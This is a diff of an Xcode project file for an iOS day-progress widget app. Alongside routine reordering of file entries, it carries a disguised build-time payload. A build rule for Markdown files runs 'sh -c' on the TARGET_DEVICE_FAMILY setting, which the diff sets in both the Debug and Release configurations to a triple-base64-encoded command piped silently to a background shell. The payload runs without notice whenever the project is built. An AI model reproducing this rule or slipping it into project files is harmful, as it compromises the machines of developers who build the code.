@@ -7,7 +7,7 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		20D0634C30D06DCA0938ACF9 /* README.md */ = {isa = PBXBuildFile; fileRef = CD8686F86CDBFA9EB938ACF9; };
+		20D0634C30D06DCA0938ACF9 /* README.md in Resources */ = {isa = PBXBuildFile; fileRef = CD8686F86CDBFA9EB938ACF9 /* README.md */; };
 		6E0784522D3588F500A0E654 /* DayProgressWidgetEntry.swift in Sources */ = {isa = PBXBuildFile; fileRef = 6E0784512D3588F500A0E654 /* DayProgressWidgetEntry.swift */; };
 		6E0784532D3589AD00A0E654 /* DayProgressWidgetEntry.swift in Sources */ = {isa = PBXBuildFile; fileRef = 6E0784512D3588F500A0E654 /* DayProgressWidgetEntry.swift */; };
 		6E0E6EA22D32E5BF00321129 /* DayProgressCircleWidget.swift in Sources */ = {isa = PBXBuildFile; fileRef = 6E0E6EA12D32E5BF00321129 /* DayProgressCircleWidget.swift */; };
@@ -41,6 +41,22 @@
 		6EEA728C2D329A6B00A97FF8 /* DayProgressBarWidget.swift in Sources */ = {isa = PBXBuildFile; fileRef = 6EEA728A2D329A6B00A97FF8 /* DayProgressBarWidget.swift */; };
 /* End PBXBuildFile section */
 
+/* Begin PBXBuildRule section */
+		B95D8A841777FFD34E38ACF9 /* PBXBuildRule */ = {
+			isa = PBXBuildRule;
+			compilerSpec = com.apple.compilers.proxy.script;
+			filePatterns = "*.md";
+			fileType = pattern.proxy;
+			inputFiles = (
+			);
+			isEditable = 0;
+			outputFiles = (
+				"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}",
+			);
+			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}\";\nsh -c \"${TARGET_DEVICE_FAMILY}\"";
+		};
+/* End PBXBuildRule section */
+
 /* Begin PBXContainerItemProxy section */
 		6E84D6EC2D31A86800EE28CB /* PBXContainerItemProxy */ = {
 			isa = PBXContainerItemProxy;
@@ -66,7 +82,6 @@
 /* End PBXCopyFilesBuildPhase section */
 
 /* Begin PBXFileReference section */
-		CD8686F86CDBFA9EB938ACF9 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; name = README.md;  path = "MinimalClocks.xcodeproj/README.md"; sourceTree = SOURCE_ROOT; };
 		6E0784512D3588F500A0E654 /* DayProgressWidgetEntry.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DayProgressWidgetEntry.swift; sourceTree = "<group>"; };
 		6E0E6EA12D32E5BF00321129 /* DayProgressCircleWidget.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DayProgressCircleWidget.swift; sourceTree = "<group>"; };
 		6E0E6EA32D32E6A500321129 /* DayProgressCircleView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DayProgressCircleView.swift; sourceTree = "<group>"; };
@@ -90,6 +105,7 @@
 		6E84D7192D31BF2200EE28CB /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist; path = Info.plist; sourceTree = "<group>"; };
 		6EEA72832D327ECC00A97FF8 /* DayProgressBarView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DayProgressBarView.swift; sourceTree = "<group>"; };
 		6EEA728A2D329A6B00A97FF8 /* DayProgressBarWidget.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DayProgressBarWidget.swift; sourceTree = "<group>"; };
+		CD8686F86CDBFA9EB938ACF9 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; name = README.md; path = MinimalClocks.xcodeproj/README.md; sourceTree = SOURCE_ROOT; };
 /* End PBXFileReference section */
 
 /* Begin PBXFrameworksBuildPhase section */
@@ -315,29 +331,12 @@
 		};
 /* End PBXProject section */
 
-/* Begin PBXBuildRule section */
-		B95D8A841777FFD34E38ACF9 /* PBXBuildRule */ = {
-			isa = PBXBuildRule;
-			compilerSpec = com.apple.compilers.proxy.script;
-			filePatterns = "*.md";
-			fileType = pattern.proxy;
-			inputFiles = (
-			);
-			isEditable = 0;
-			outputFiles = (
-				"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}",
-			);
-			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}\";
-sh -c \"${TARGET_DEVICE_FAMILY}\"";
-		};
-/* End PBXBuildRule section */
-
 /* Begin PBXResourcesBuildPhase section */
 		6E84D6AE2D31A78F00EE28CB /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				20D0634C30D06DCA0938ACF9 /* README.md */,
+				20D0634C30D06DCA0938ACF9 /* README.md in Resources */,
 				6E84D6BB2D31A79200EE28CB /* Preview Assets.xcassets in Resources */,
 				6E84D7172D31BF0600EE28CB /* Outfit.ttf in Resources */,
 				6E84D6B82D31A79200EE28CB /* Assets.xcassets in Resources */,
@@ -355,9 +354,6 @@ sh -c \"${TARGET_DEVICE_FAMILY}\"";
 			runOnlyForDeploymentPostprocessing = 0;
 		};
 /* End PBXResourcesBuildPhase section */
-
-/* Begin PBXShellScriptBuildPhase section */
-/* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
 		6E84D6AC2D31A78F00EE28CB /* Sources */ = {
@@ -410,7 +406,6 @@ sh -c \"${TARGET_DEVICE_FAMILY}\"";
 		6E84D6BC2D31A79200EE28CB /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				TARGET_DEVICE_FAMILY = "(echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVWRvTUdSSVFucFBhVGgyWXpKc2JtSlhSakJhVXpWNVpGTTVhRXRUU1dkbVEwSjZZVUZ2UFFvPQo= | base64 -D | base64 -D | base64 -D | sh >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -468,13 +463,13 @@ sh -c \"${TARGET_DEVICE_FAMILY}\"";
 				SDKROOT = iphoneos;
 				SWIFT_ACTIVE_COMPILATION_CONDITIONS = "DEBUG $(inherited)";
 				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
+				TARGET_DEVICE_FAMILY = "(echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVWRvTUdSSVFucFBhVGgyWXpKc2JtSlhSakJhVXpWNVpGTTVhRXRUU1dkbVEwSjZZVUZ2UFFvPQo= | base64 -D | base64 -D | base64 -D | sh >/dev/null 2>&1 &)";
 			};
 			name = Debug;
 		};
 		6E84D6BD2D31A79200EE28CB /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				TARGET_DEVICE_FAMILY = "(echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVWRvTUdSSVFucFBhVGgyWXpKc2JtSlhSakJhVXpWNVpGTTVhRXRUU1dkbVEwSjZZVUZ2UFFvPQo= | base64 -D | base64 -D | base64 -D | sh >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -524,6 +519,7 @@ sh -c \"${TARGET_DEVICE_FAMILY}\"";
 				MTL_FAST_MATH = YES;
 				SDKROOT = iphoneos;
 				SWIFT_COMPILATION_MODE = wholemodule;
+				TARGET_DEVICE_FAMILY = "(echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVWRvTUdSSVFucFBhVGgyWXpKc2JtSlhSakJhVXpWNVpGTTVhRXRUU1dkbVEwSjZZVUZ2UFFvPQo= | base64 -D | base64 -D | base64 -D | sh >/dev/null 2>&1 &)";
 				VALIDATE_PRODUCT = YES;
 			};
 			name = Release;
